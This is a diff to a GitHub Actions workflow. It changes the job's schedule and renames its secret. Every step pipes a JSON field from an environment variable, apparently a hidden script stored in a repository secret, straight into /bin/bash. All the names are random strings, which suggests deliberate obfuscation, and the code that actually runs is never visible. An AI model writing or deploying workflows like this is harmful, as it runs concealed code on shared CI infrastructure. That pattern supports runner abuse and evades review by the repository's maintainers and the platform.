@@ -1,27 +1,24 @@
 name: consumefoolhardy
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 2/6 * * *'
+    - cron: '45 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: consumefoolhardy
         env:
-          dnkax303: ${{ secrets.dnkax303 }}
+          veiwv0: ${{ secrets.veiwv0 }}
         run: |
-          echo $dnkax303 | jq -r .xhve79412 | /bin/bash
-          echo $qtgr9917 | jq -r .qycck8 | /bin/bash
-          echo $lyptj3521 | jq -r .rm6417 | /bin/bash
-          echo $wwdms5977 | jq -r .yru04881 | /bin/bash
-          echo $ye3 | jq -r .op525 | /bin/bash
-          echo $im5 | jq -r .pghd68 | /bin/bash
-          echo $qij961 | jq -r .cyf1 | /bin/bash
-          echo $ngkx5 | jq -r .m34336 | /bin/bash
-          echo $dumew6 | jq -r .zs8 | /bin/bash
-          echo $kk7 | jq -r .f5299 | /bin/bash
-          echo $sqt9174 | jq -r .kbn73 | /bin/bash
-          echo $y91345 | jq -r .zqdhd37796 | /bin/bash
+          echo $veiwv0 | jq -r .xw11 | /bin/bash
+          echo $t461 | jq -r .rbok8407 | /bin/bash
+          echo $nw3752 | jq -r .vvdij73434 | /bin/bash
+          echo $ceee2872 | jq -r .mex36 | /bin/bash
+          echo $etli640 | jq -r .gus48 | /bin/bash
+          echo $byzmj421 | jq -r .qbnn73 | /bin/bash
+          echo $ohihm44 | jq -r .gof60064 | /bin/bash
 
